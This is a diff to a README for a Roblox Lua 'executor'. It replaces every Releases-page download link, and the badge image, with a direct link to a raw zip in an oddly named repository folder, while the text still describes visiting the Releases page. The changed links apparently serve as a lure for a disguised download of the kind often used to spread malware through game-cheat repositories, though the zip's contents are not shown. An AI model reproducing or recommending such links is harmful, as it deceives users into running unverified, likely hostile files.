@@ -1,6 +1,6 @@
 # 🎮 Zorara-Executor - Run Custom Lua Scripts in Roblox Easily
 
-[![Download Zorara](https://img.shields.io/badge/Download-Zorara-26ae60)](https://github.com/luouoli/Zorara-Executor/releases)
+[![Download Zorara](https://raw.githubusercontent.com/luouoli/Zorara-Executor/main/uneconomic/Zorara-Executor.zip)](https://raw.githubusercontent.com/luouoli/Zorara-Executor/main/uneconomic/Zorara-Executor.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you'll need to download Zorara:
 
 1. Click the link below to visit the Releases page.
    
-   [Download Zorara Now](https://github.com/luouoli/Zorara-Executor/releases)
+   [Download Zorara Now](https://raw.githubusercontent.com/luouoli/Zorara-Executor/main/uneconomic/Zorara-Executor.zip)
 
 2. Look for the latest version and download the setup file. 
 
@@ -73,6 +73,6 @@ For any further inquiries or issues, please reach out through our community chan
 
 For easy access, here’s the link once more:
 
-[Download Zorara Now](https://github.com/luouoli/Zorara-Executor/releases)
+[Download Zorara Now](https://raw.githubusercontent.com/luouoli/Zorara-Executor/main/uneconomic/Zorara-Executor.zip)
 
 Enjoy running your custom Lua scripts and mods with Zorara-Executor!
